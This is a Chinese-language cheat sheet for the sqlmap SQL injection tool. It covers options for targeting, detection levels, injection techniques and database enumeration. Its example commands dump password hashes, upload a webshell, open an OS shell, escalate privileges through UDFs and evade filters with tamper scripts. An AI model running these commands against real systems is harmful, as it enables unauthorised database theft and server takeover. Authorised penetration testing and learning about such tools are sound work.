---
title: sqlmap简要手册
---
# sqlmap简介

**当给sqlmap一个URL，它会干些什么？**

> 1）判断可注入的参数
>
> 2）判断可以用那种SQL注入技术来注入
>
> 3）识别出哪种数据库
>
> 4）根据用户选择，读取哪些数据

```bash
--purge		#清除历史缓存
```

# 选项摘要

#### **输出信息的详细程度**

```bash
-v	#共7个级别(0~6)，默认为1
#可以用 -vv 代替 -v 2，推荐使用这种方法
```

- **0**：只输出 Python 出错回溯信息，错误和关键信息
- **1**：增加输出普通信息和警告信息
- **2**：增加输出调试信息
- **3**：增加输出已注入的 payloads
- **4**：增加输出 HTTP 请求
- **5**：增加输出 HTTP 响应头
- **6**：增加输出 HTTP 响应内容

#### **目标**

```bash
-d	#直连数据库，"mysql://root:root@192.168.0.8:3306/testdb"
-u URL
-l	#从Burp代理日志文件中解析目标地址
-m	#从文本文件中批量获取目标
-r	#从文件中读取 HTTP 请求

--purge			#清除历史缓存
--flush-session	#清除上次扫描的缓存
```

#### **请求**

指定连接目标地址的方式

```bash
--method=METHOD		#强制使用提供的 HTTP 方法（例如：PUT）
--data=DATA			#使用 POST 发送数据串；--data="id=1&user=admin"
--param-del=";"		#使用参数分隔符，--data="id=1;user=admin"
--cookie=COOKIE		#指定 HTTP Cookie ，--cookie "id=11" --level 2
--drop-set-cookie	#忽略 HTTP 响应中的 Set-Cookie 参数
--user-agent=AGENT	#指定 HTTP User-Agent
--random-agent		#使用随机的 HTTP User-Agent，随机从 ./txt/user-agents.txt 选一个，不是每次请求换一个
--referer=REFERER	#指定 HTTP Referer
-H HEADER			#设置额外的 HTTP 头参数（例如："X-Forwarded-For: 127.0.0.1"）
--headers=HEADERS	#设置额外的 HTTP 头参数,必须以换行符分隔（例如："Accept-Language: fr\nETag: 123"）
--delay=10			#设置每个 HTTP 请求的延迟秒数
--safe-freq=SAFE	#每访问两次给定的合法 URL 才发送一次测试请求
```

#### **注入**

以下选项用于指定要测试的参数

提供自定义注入 payloads 和篡改参数的脚本

```bash
-p TESTPARAMETER	#指定需要测试的参数
--skip=SKIP			#指定要跳过的参数
--dbms=DBMS			#指定 DBMS 类型（例如：MySQL）
--os=OS				#指定 DBMS 服务器的操作系统类型
--prefix=PREFIX		#注入 payload 的前缀字符串
--suffix=SUFFIX		#注入 payload 的后缀字符串
--tamper=TAMPER		#用给定脚本修改注入数据
```

#### **检测**

sqlmap 使用的 payloads 直接从文本文件 `xml/payloads.xml` 中载入。

根据该文件顶部的相关指导说明进行设置，如果 sqlmap 漏过了特定的注入，

你可以选择自己修改指定的 payload 用于检测。 



**level有5级，越高检测越全，默认为 1**

> --level 1	检测Get和Post
>
> --level 2	检测HTTP Cookie
>
> --level 3	检测User-Agent和Referer
>
> --level 4	检测
>
> --level 5	检测 HOST 头

**risk有3级，级别越高风险越大，默认为1**

> --risk 2	 会在默认的检测上添加大量时间型盲注语句测试 
>
> --risk 3	 会在原基础上添加`OR` 类型的布尔型盲注 ，可能会update导致修改数据库

#### **技术**

以下选项用于调整特定 SQL 注入技术的测试方法

```bash
--technique=TECH	#使用的 SQL 注入技术（默认为“BEUSTQ”)
B: Boolean-based blind SQL injection（布尔型盲注）
E: Error-based SQL injection（报错型注入）
U: UNION query SQL injection（联合查询注入）
S: Stacked queries SQL injection（堆查询注入）
T: Time-based blind SQL injection（时间型盲注）
Q: inline Query injection（内联查询注入）

--time-sec=TIMESEC  #设置延时注入的时间（默认为 5）
--second-order=S..  #设置二阶响应的结果显示页面的 URL（该选项用于二阶 SQL 注入）
```

#### **枚举**

以下选项用于获取数据库的信息，结构和数据表中的数据。

```bash
-a, --all          #获取所有信息、数据
-b, --banner        #获取 DBMS banner,返回数据库的版本号
--current-user			#获取 DBMS 当前用户
--current-db			#获取 DBMS 当前数据库
--hostname				#获取 DBMS 服务器的主机名
--is-dba				#探测 DBMS 当前用户是否为 DBA（数据库管理员）
--users					#枚举出 DBMS 所有用户
--passwords				#枚举出 DBMS 所有用户的密码哈希
--privileges			#枚举出 DBMS 所有用户特权级
--roles					#枚举出 DBMS 所有用户角色

--dbs					#枚举出 DBMS 所有数据库
--tables				#枚举出 DBMS 数据库中的所有表
--columns				#枚举出 DBMS 表中的所有列
--schema				#枚举出 DBMS 所有模式
--count					#获取数据表数目
--dump					#导出 DBMS 数据库表项
--stop 10				#只取前10行数据
    
-D DB					#指定要枚举的 DBMS 数据库
-T TBL					#指定要枚举的 DBMS 数据表
-C COL					#指定要枚举的 DBMS 数据列
    
--sql-query=QUERY		#指定要执行的 SQL 语句
--sql-shell				#调出交互式 SQL shell
```

# 用例

**从文件读取HTTP请求，GET和POST都可以**

```bash
sqlmap -r "burp.txt" -p "username"	#-p 指定存在注入的参数
```

**Cookie注入**

```bash
sqlmap -u "http://www.vuln.com" --cookie "id=11" --level 2
```

**当防火墙，对请求速度做了限制**

```bash
sqlmap -u "http://www.vuln.com/post.php?id=1" --delay=10
#在每个HTTP请求之间的延迟10秒
```



## 伪静态注入

```bash
sqpmap  -u http://victim.com/id/666*.html --dbs  #在html扩展名前加个'*'
```

## 访问文件系统

仅对MySQL、MSSQL、PosgreSQL有效

数据库用户有读写权限，有目录读写文件权限

```bash
sqlmap -u url --is-dba
#查看是否dba权限,必须为root权限

sqlmap -u url --file-read "C:/Windows/win.ini"		
#读取文件

sqlmap -u url --file-write=D:/shell.php --file-dest=C:/www/shell.php
#上传文件 (本地木马路径:目标网站目录)
```

## 接管操作系统

仅对MySQL、MSSQL、PosgreSQL有效

数据库用户有读写权限，有目录读写文件权限

 sqlmap 能够在**数据库所在服务器的操作系统上运行任意的命令** 

```bash
sqlmap -u "URL" --os-shell	#获取系统交互shell或--os-cmd=id执行系统命令
```

[原理](https://blog.sari3l.com/posts/8dea0d95/)就是上传一个upload木马后，再上传一个cmd shell；

当 --os-shell 退出后， 会调用后门脚本删除上传文件后，进行自删除。

> 在 MySQL 和 PostgreSQL 中，sqlmap 可以上传一个包含两个用户自定义函数
>
> 分别为 `sys_exec()` 和 `sys_eval()` 的共享库（二进制文件）
>
> 然后在数据库中创建出两个对应函数，并调用对应函数执行特定的命令，并允许用户选择是否打印出相关命令执行的结果。
>
> 在 Microsoft SQL Server 中，sqlmap 会利用 `xp_cmdshell` 存储过程：
>
> 如果该存储过程被关闭了（Microsoft SQL Server 的 2005 及以上版本默认关闭），sqlmap 则会将其重新打开；
>
> 如果该存储过程不存在，sqlmap 则会重新创建它。
>
> 当用户请求标准输出，sqlmap 将使用任何可用的 SQL 注入技术（盲注、带内注入、报错型注入）去获取对应结果。
>
> 相反，如果无需标准输出对应结果，sqlmap 则会使用堆叠查询注入（Stacked queries）技术执行相关的命令。
>
> 
>
> 如果堆叠查询没有被 Web 应用识别出来，并且 DBMS 为 MySQL，
>
> 假如后端 DBMS 和 Web 服务器在同一台服务器上，
>
> 则仍可以通过利用 `SELECT` 语句中的 `INTO OUTFILE`，在 根目录可写目录中写shell

## UDF提权

使用选项 `--udf-inject` 并按照说明进行操作即可；

如果需要，也可以使用 `--shared-lib` 选项通过命令行指定共享库的本地文件系统路径。

否则 sqlmap 会在运行时向你询问路径。 

此功能仅对 MySQL 或 PostgreSQL 有用。 

# tamper脚本

```bash
use age：sqlmap.py --tamper="模块名.py"
```

```bash
apostrophemask			#将单引号 url 编码
apostrophenullencode	#将单引号替换为宽字节 unicode 字符
base64encode			#base64 编码
between			#将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况
bluecoat		#用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况
charencode				#用 url 编码一次你的 payload
charunicodeencode		#用 unicode 编码 payload ，只编码非编码字符
```

[自定义tamper](https://wooyun.js.org/drops/SQLMAP%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8.html)

